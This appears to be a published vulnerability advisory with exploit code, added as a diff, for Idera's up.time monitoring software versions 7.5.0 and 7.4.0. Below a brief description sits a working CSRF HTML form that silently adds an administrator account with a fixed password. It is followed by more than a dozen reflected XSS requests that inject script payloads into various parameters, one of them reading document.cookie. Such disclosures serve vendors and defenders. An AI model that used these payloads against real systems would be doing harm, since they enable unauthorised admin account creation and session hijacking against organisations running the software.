@@ -1,0 +1,113 @@
+﻿
+up.time 7.5.0 XSS And CSRF Add Admin Exploit
+
+
+Vendor: Idera Inc.
+Product web page: http://www.uptimesoftware.com
+Affected version: 7.5.0 (build 16) and 7.4.0 (build 13)
+
+Summary: The next-generation of IT monitoring software.
+
+Desc: The application allows users to perform certain
+actions via HTTP requests without performing any validity
+checks to verify the requests. This can be exploited to
+perform certain actions with administrative privileges
+if a logged-in user visits a malicious web site. Multiple
+cross-site scripting vulnerabilities were also discovered.
+The issue is triggered when input passed via the multiple
+parameters is not properly sanitized before being returned
+to the user. This can be exploited to execute arbitrary HTML
+and script code in a user's browser session in context of
+an affected site.
+
+Tested on: Jetty, PHP/5.4.34, MySQL
+           Apache/2.2.29 (Win64) mod_ssl/2.2.29 OpenSSL/1.0.1j PHP/5.4.34
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2015-5252
+Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2015-5252.php
+
+
+29.07.2015
+
+--
+
+
+CSRF Add Admin:
+---------------
+
+<html>
+  <body>
+    <form action="http://127.0.0.1:9999/main.php?section=UserContainer&subsection=add&id=0" method="POST">
+      <input type="hidden" name="operation" value="submit" />
+      <input type="hidden" name="disableEditOfUsernameRoleGroup" value="false" />
+      <input type="hidden" name="username" value="Testingus4" />
+      <input type="hidden" name="password" value="123123" />
+      <input type="hidden" name="passwordConfirm" value="123123" />
+      <input type="hidden" name="firstname" value="Test" />
+      <input type="hidden" name="lastname" value="Ingus" />
+      <input type="hidden" name="location" value="Neverland" />
+      <input type="hidden" name="emailaddress" value="test4&#64;test&#46;test" />
+      <input type="hidden" name="emailtimeperiodid" value="1" />
+      <input type="hidden" name="phonenumber" value="111111" />
+      <input type="hidden" name="phonenumbertimeperiodid" value="1" />
+      <input type="hidden" name="windowshost" value="test" />
+      <input type="hidden" name="windowsworkgroup" value="testgroup" />
+      <input type="hidden" name="windowspopuptimeperiodid" value="1" />
+      <input type="hidden" name="landingpage" value="MyPortal" />
+      <input type="hidden" name="isonvacation" value="0" />
+      <input type="hidden" name="receivealerts" value="on" />
+      <input type="hidden" name="receivealerts" value="1" />
+      <input type="hidden" name="alertoncritical" value="on" />
+      <input type="hidden" name="alertoncritical" value="1" />
+      <input type="hidden" name="alertonwarning" value="on" />
+      <input type="hidden" name="alertonwarning" value="1" />
+      <input type="hidden" name="alertonunknown" value="on" />
+      <input type="hidden" name="alertonunknown" value="1" />
+      <input type="hidden" name="alertonrecovery" value="on" />
+      <input type="hidden" name="alertonrecovery" value="1" />
+      <input type="hidden" name="activexgraphs" value="0" />
+      <input type="hidden" name="newuser" value="on" />
+      <input type="hidden" name="newuser" value="1" />
+      <input type="hidden" name="userroleid" value="2" />
+      <input type="hidden" name="usergroupid&#91;&#93;" value="1" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
+
+
+Reflected XSS:
+--------------
+
+GET /main.php?section=UserContainer&subsection=edit&id=bc6ac%22%3E%3Cimg%20src%3da%20onerror%3dalert%28document.cookie%29;%3E&name=Testingus4 HTTP/1.1
+-
+GET /main.php?section=UserGroup&subsection=add&operation=submit&id=0&usergroupname=kakodane1&usergroupdescription=kakodane2&usermembership%5B%5D=6&entitymembership%5B%5D=1&entitygroupmembership%5B%5D=1a416c%253c%252fscript%253e%253cscript%253ealert%25281%2529%253c%252fscript%253ea233bd169b0 HTTP/1.1
+-
+GET /main.php?section=UserGroup&subsection=add&operation=submit&id=0&usergroupname=kakodane1&usergroupdescription=kakodane2&usermembership%5B%5D=6&entitymembership%5B%5D=14f2e6%253c%252fscript%253e%253cscript%253ealert%25281%2529%253c%252fscript%253e46cfd43d432&entitygroupmembership%5B%5D=1 HTTP/1.1
+-
+GET /main.php?section=UserContainer&subsection=edit&id=bc6ac"><img%20src%3da%20onload%3dalert(1)>f2c23&name=Testingus4 HTTP/1.1
+-
+GET /main.php?page=Users&subPage=UserContainer&subsection=view&id=240689'%3balert(1)%2f%2f205 HTTP/1.1
+-
+GET /main.php?section=UserContainer&subsection=edit&id=6&name=Testingus4e8b7f%253c%252ftitle%253e%253cscript%253ealert%25281%2529%253c%252fscript%253eadfb7 HTTP/1.1
+-
+GET /main.php?section=UserContainer&subsection=edit7bef8%253c%252ftitle%253e%253cscript%253ealert%25281%2529%253c%252fscript%253ea9095&id=6&name=Testingus4 HTTP/1.1
+-
+GET /main.php?section=UserGroup&subsection=add270d4%253c%252ftitle%253e%253cscript%253ealert%25281%2529%253c%252fscript%253e8c1acb1f950&operation=submit&id=0&usergroupname=kakodane1&usergroupdescription=kakodane2&usermembership%5B%5D=6&entitymembership%5B%5D=1&entitygroupmembership%5B%5D=1 HTTP/1.1
+-
+GET /main.php?page=Reports&subPage=ReportResourceUsage&subsection=edit&operation=submit&range_type=explicit&txtFromDate=2015-07-28a3345"><img%20src%3da%20onload%3dalert(1)>2d6845d9556&txtFromTime=00%3A00%3A00&txtToDate=2015-07-28&txtToTime=23%3A59%3A59&quickdatevalue=1&quickdatetype=day&relativedate=today&value_%5BselectAll_reportoptions%5D=false&reportoptions%5BreportResourceUtilization%5D-visible-checkbox=true&reportoptions%5BreportResourceUtilization%5D=true&reportoptions%5BchartCPUStats%5D-visible-checkbox=true&reportoptions%5BchartCPUStats%5D=true&reportoptions%5BchartMultiCPUPerformanceTotal%5D=false&reportoptions%5BchartNetworkIO%5D=false&reportoptions%5BchartNetworkErrors%5D=false&reportoptions%5BchartTCPRetransmits%5D=false&reportoptions%5BchartFreeMemory%5D=false&reportoptions%5BchartPageScanningStats%5D=false&reportoptions%5BchartDiskStats%5D=false&reportoptions%5BchartFSCap%5D=false&reportoptions%5BchartWorkloadCPU%5D=false&reportoptions%5BchartWorkloadMemSize%5D=false&reportoptions%5BchartWorkloadRSS%5D=false&reportoptions%5BgroupReportBySystem%5D-visible-checkbox=true&reportoptions%5BgroupReportBySystem%5D=true&listtype=system&value_%5BselectAll_entitygroup%5D=false&value_%5Bincludesubgroups%5D=true&includesubgroups=on&entitygroup%5B1%5D=false&value_%5BselectAll_entityview%5D=false&value_%5BselectAll_entity%5D=false&entity%5B1%5D=false&generate_xml=XML+to+Screen&email_type_save=email_user_save&user_email_id_save=1&other_email_address_save=&save_as_name=&save_as_description=&genopt=htmlscreen&email_type=email_user&user_email_id=1&other_email_address= HTTP/1.1
+-
+GET /main.php?page=Reports&subPage=ReportResourceUsage&subsection=edit&operation=submit&range_type=explicit&txtFromDate=2015-07-28&txtFromTime=00%3a00%3a006795f"><img%20src%3da%20onload%3dalert(1)>c92fbc98475&txtToDate=2015-07-28&txtToTime=23%3A59%3A59&quickdatevalue=1&quickdatetype=day&relativedate=today&value_%5BselectAll_reportoptions%5D=false&reportoptions%5BreportResourceUtilization%5D-visible-checkbox=true&reportoptions%5BreportResourceUtilization%5D=true&reportoptions%5BchartCPUStats%5D-visible-checkbox=true&reportoptions%5BchartCPUStats%5D=true&reportoptions%5BchartMultiCPUPerformanceTotal%5D=false&reportoptions%5BchartNetworkIO%5D=false&reportoptions%5BchartNetworkErrors%5D=false&reportoptions%5BchartTCPRetransmits%5D=false&reportoptions%5BchartFreeMemory%5D=false&reportoptions%5BchartPageScanningStats%5D=false&reportoptions%5BchartDiskStats%5D=false&reportoptions%5BchartFSCap%5D=false&reportoptions%5BchartWorkloadCPU%5D=false&reportoptions%5BchartWorkloadMemSize%5D=false&reportoptions%5BchartWorkloadRSS%5D=false&reportoptions%5BgroupReportBySystem%5D-visible-checkbox=true&reportoptions%5BgroupReportBySystem%5D=true&listtype=system&value_%5BselectAll_entitygroup%5D=false&value_%5Bincludesubgroups%5D=true&includesubgroups=on&entitygroup%5B1%5D=false&value_%5BselectAll_entityview%5D=false&value_%5BselectAll_entity%5D=false&entity%5B1%5D=false&generate_xml=XML+to+Screen&email_type_save=email_user_save&user_email_id_save=1&other_email_address_save=&save_as_name=&save_as_description=&genopt=htmlscreen&email_type=email_user&user_email_id=1&other_email_address= HTTP/1.1
+-
+GET /main.php?page=Reports&subPage=ReportResourceUsage&subsection=edit&operation=submit&range_type=explicit&txtFromDate=2015-07-28&txtFromTime=00%3A00%3A00&txtToDate=2015-07-28c0570"><img%20src%3da%20onload%3dalert(1)>77b8cd697e9&txtToTime=23%3A59%3A59&quickdatevalue=1&quickdatetype=day&relativedate=today&value_%5BselectAll_reportoptions%5D=false&reportoptions%5BreportResourceUtilization%5D-visible-checkbox=true&reportoptions%5BreportResourceUtilization%5D=true&reportoptions%5BchartCPUStats%5D-visible-checkbox=true&reportoptions%5BchartCPUStats%5D=true&reportoptions%5BchartMultiCPUPerformanceTotal%5D=false&reportoptions%5BchartNetworkIO%5D=false&reportoptions%5BchartNetworkErrors%5D=false&reportoptions%5BchartTCPRetransmits%5D=false&reportoptions%5BchartFreeMemory%5D=false&reportoptions%5BchartPageScanningStats%5D=false&reportoptions%5BchartDiskStats%5D=false&reportoptions%5BchartFSCap%5D=false&reportoptions%5BchartWorkloadCPU%5D=false&reportoptions%5BchartWorkloadMemSize%5D=false&reportoptions%5BchartWorkloadRSS%5D=false&reportoptions%5BgroupReportBySystem%5D-visible-checkbox=true&reportoptions%5BgroupReportBySystem%5D=true&listtype=system&value_%5BselectAll_entitygroup%5D=false&value_%5Bincludesubgroups%5D=true&includesubgroups=on&entitygroup%5B1%5D=false&value_%5BselectAll_entityview%5D=false&value_%5BselectAll_entity%5D=false&entity%5B1%5D=false&generate_xml=XML+to+Screen&email_type_save=email_user_save&user_email_id_save=1&other_email_address_save=&save_as_name=&save_as_description=&genopt=htmlscreen&email_type=email_user&user_email_id=1&other_email_address= HTTP/1.1
+-
+GET /main.php?page=Reports&subPage=ReportResourceUsage&subsection=edit&operation=submit&range_type=explicit&txtFromDate=2015-07-28&txtFromTime=00%3A00%3A00&txtToDate=2015-07-28&txtToTime=23%3a59%3a592b983"><img%20src%3da%20onload%3dalert(1)>0d9cc3967ae&quickdatevalue=1&quickdatetype=day&relativedate=today&value_%5BselectAll_reportoptions%5D=false&reportoptions%5BreportResourceUtilization%5D-visible-checkbox=true&reportoptions%5BreportResourceUtilization%5D=true&reportoptions%5BchartCPUStats%5D-visible-checkbox=true&reportoptions%5BchartCPUStats%5D=true&reportoptions%5BchartMultiCPUPerformanceTotal%5D=false&reportoptions%5BchartNetworkIO%5D=false&reportoptions%5BchartNetworkErrors%5D=false&reportoptions%5BchartTCPRetransmits%5D=false&reportoptions%5BchartFreeMemory%5D=false&reportoptions%5BchartPageScanningStats%5D=false&reportoptions%5BchartDiskStats%5D=false&reportoptions%5BchartFSCap%5D=false&reportoptions%5BchartWorkloadCPU%5D=false&reportoptions%5BchartWorkloadMemSize%5D=false&reportoptions%5BchartWorkloadRSS%5D=false&reportoptions%5BgroupReportBySystem%5D-visible-checkbox=true&reportoptions%5BgroupReportBySystem%5D=true&listtype=system&value_%5BselectAll_entitygroup%5D=false&value_%5Bincludesubgroups%5D=true&includesubgroups=on&entitygroup%5B1%5D=false&value_%5BselectAll_entityview%5D=false&value_%5BselectAll_entity%5D=false&entity%5B1%5D=false&generate_xml=XML+to+Screen&email_type_save=email_user_save&user_email_id_save=1&other_email_address_save=&save_as_name=&save_as_description=&genopt=htmlscreen&email_type=email_user&user_email_id=1&other_email_address= HTTP/1.1
+-
+GET /main.php?section=UserGroup&subsection=add&operation=submit&id=0&usergroupname=kakodane1&usergroupdescription=kakodane26cca6"><img%20src%3da%20onload%3dalert(1)>84e475837bc&usermembership%5B%5D=6&entitymembership%5B%5D=1&entitygroupmembership%5B%5D=1 HTTP/1.1
+-
+GET /main.php?section=UserGroup&subsection=add&operation=submit&id=0&usergroupname=kakodane1&usergroupdescription=kakodane2&usermembership%5B%5D=6b50fa%253c%252fscript%253e%253cscript%253ealert%25281%2529%253c%252fscript%253ed94954ba0d3&entitymembership%5B%5D=1&entitygroupmembership%5B%5D=1 HTTP/1.1
